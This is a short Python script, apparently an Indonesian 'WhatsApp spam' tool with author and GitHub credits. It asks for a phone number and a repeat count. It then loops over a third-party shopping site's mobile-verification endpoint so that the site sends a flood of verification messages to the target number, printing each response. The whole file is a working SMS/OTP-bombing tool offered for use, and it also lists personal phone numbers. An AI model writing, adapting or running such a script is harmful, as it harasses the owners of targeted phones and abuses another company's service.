#!/bin/bash/python
#coding_utf-8
#author:RikyRipaldo
#contact:+6285789116608

import requests, os
from requests.exceptions import ConnectionError, ReadTimeout

os.system("clear")
os.system("screenfetch")

#nomor = "82373105089"
crypt = "\x1b[0;93m\x1b(0q\x1b(B"
x = "\x1b[0;97m(\x1b[0;92m+\x1b[0;97m)"

print(crypt*50)
print(f"{x} \x1b[0;92mAuthor \x1b[0;91m: \x1b[0;97mRiky Ripaldo")
print(f"{x} \x1b[0;92mGithub \x1b[0;91m: \x1b[3;97mhttps://github.com/RikyXDZ")
print(crypt*50)
print(f"{x} Masukan Nomor Tanpa Angka (0) Dan (+62)\n    Di Awal Contoh: 81275889066")
try:
  nomor = int(input(f"{x} \x1b[0;92mNomor \x1b[0;91m: \x1b[0;97m"))
except:
  print(f"{x} Isi Yang Benar Zeyenk !")
  exit("Sayonaraaaaa.......")
total = input(f"{x} \x1b[0;91mTotal \x1b[0;92m:\x1b[0;97m ")
print(crypt*50)

for i in range(int(total)):
  try:
    req = requests.get(f"https://id.jagreward.com/member/verify-mobile/{nomor}/")
  except ConnectionError:
    print(f"{x} \x1b[0;93mBeli Paket Dlu Kawan")
    exit()
  except ReadTimeout:
    print(f"{x} \x1b[0;93mJaringan mu Lemot")
    exit()
  print(crypt*50)
  print(f"{x} \x1b[0;92mSpam Whatsapp \x1b[0;97m(\x1b[0;93m+62 \x1b[0;97m{nomor}) \x1b[0;92m",req)
  print(f"\x1b[0;91m(\x1b[0;96m{i}\x1b[0;91m)\x1b[0;97m",req.encoding)
  print(f"{x}",req.status_code)
  print(f"{x}",req.headers['Content-Type'])
  print(f"{x}",req.json())
  print(crypt*50)

print(f"{x} \x1b[0;95mSelesai +++++")
